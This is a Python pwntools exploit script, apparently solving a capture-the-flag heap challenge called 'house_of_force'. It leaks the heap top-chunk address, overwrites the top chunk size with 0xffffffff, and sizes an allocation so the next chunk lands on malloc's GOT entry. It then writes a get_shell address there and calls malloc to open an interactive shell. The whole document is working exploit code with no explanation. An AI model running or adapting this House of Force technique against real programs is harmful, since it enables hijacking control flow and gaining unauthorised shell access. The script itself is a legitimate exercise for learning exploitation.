from pwn import *
import warnings

warnings.filterwarnings('ignore')
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process('./house_of_force')
elf = context.binary = ELF('./house_of_force', checksec=False)
context.log_level = 'debug'
get_shell = 0x804887e
malloc_got = elf.got['malloc']

# Leak topchunck_addr
io.sendlineafter("> ", "1")
io.sendlineafter(": ", "8")
io.sendlineafter(": ", "a"*8)

heap_addr = io.recvuntil(b":").replace(b":",b"").decode()
topchunk_addr = int(heap_addr, 16) + 4*3

log.info(hex(topchunk_addr))

log.info("Overwriting Top Chunk")
io.sendlineafter(b"> ", "2")
io.sendlineafter(b": ", "0")
io.sendlineafter(b": ", "3")
io.sendlineafter(b": ", str(0xffffffff))

# io.interactive()
target_size = malloc_got - topchunk_addr - 0x8
log.info(hex(target_size))

log.info("Allocate target addr size")
io.sendlineafter(">", "1")
io.sendlineafter(":", str(target_size))
io.sendlineafter(":", "a")

log.info("Overwrite target ")
io.sendlineafter("> ", "1")
io.sendlineafter(": ", str(4))
io.sendlineafter(": ", p32(get_shell))

# call malloc
io.sendlineafter("> ", '1')
io.sendlineafter("Size: ", str(0x4))

io.interactive()
